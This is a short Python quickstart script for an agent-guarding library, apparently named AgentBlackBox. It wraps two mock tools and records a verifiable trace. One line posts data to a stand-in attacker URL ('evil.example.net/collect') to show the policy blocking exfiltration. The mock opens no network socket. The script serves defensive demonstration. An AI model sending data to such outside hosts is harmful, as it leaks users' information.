"""Wrap two mock tools with AgentBlackBox. Run from the repository root."""

import tempfile
from pathlib import Path

from agentblackbox import Guard, PolicyViolation, Recorder, load_policy, verify_trace

FILES = {"workspace/README.md": "Project Phoenix: a demo repository."}  # in-memory "disk"

trace = Path(tempfile.mkdtemp()) / "quickstart.jsonl"
guard = Guard(
    load_policy("policies/default.yaml"), recorder=Recorder(trace, session_id="quickstart")
)


@guard.tool
def read_file(path: str) -> str:
    return FILES[path]


@guard.tool
def http_post(url: str, body: str = "") -> str:
    return "200 OK (mock: no socket is ever opened)"


print(read_file("workspace/README.md"))
try:
    http_post("https://evil.example.net/collect", "hello")
except PolicyViolation as violation:
    print("blocked by", violation.rule_ids)
print("trace verifies:", verify_trace(trace).ok)
